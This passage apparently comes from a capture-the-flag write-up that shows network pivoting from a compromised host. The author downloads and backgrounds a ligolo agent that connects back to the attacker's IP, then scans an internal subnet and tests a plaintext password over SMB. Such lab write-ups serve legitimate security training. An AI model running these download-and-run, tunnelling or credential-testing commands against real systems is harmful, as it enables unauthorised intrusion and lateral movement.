## As josh@SRV01
We are in, and we found a lot of ports open, we have to do a well all port forwarding to scan the network, for it we will use ligolo to nmap the net and be able to run a lot of commands ( to have a sort of session ).
After setting this up, we can run command on the route we add on the interface and have a good proxy for our commands:
`sudo /opt/tools/ligolo/proxy -selfcert -laddr 0.0.0.0:11601 # on our parrot`
``` #on our target
curl http://10.10.16.236/agent -o agent
chmod +x agent
nohup ./agent -connect 10.10.16.236:11601 -ignore-cert > /dev/null 2>&1 &
```
Here we receive a connection on our ligolo, and so a session. Then on our ligolo session
``` #on our ligolo session
interface_create --name "ligolo"
interface_add_route --name ligolo --route 240.0.0.1/32
interface_add_route --name ligolo --route 172.16.20.0/24
start --tun ligolo
```
Now we can run command to access those routes we add. like:
`sudo nmap --open 172.16.20.0/24 -oN scope_drz`
```
nxc smb 172.16.20.0/24 --generate-hosts-file hosts_drz
# 172.16.20.2     DC02.darkzero.ext darkzero.ext DC02
# 172.16.20.1     DC01.darkzero.htb darkzero.htb DC01

cat hosts_drz | sudo tee -a /etc/hosts

nxc smb 172.16.20.0/24 -u josh -p 'Rangers1'
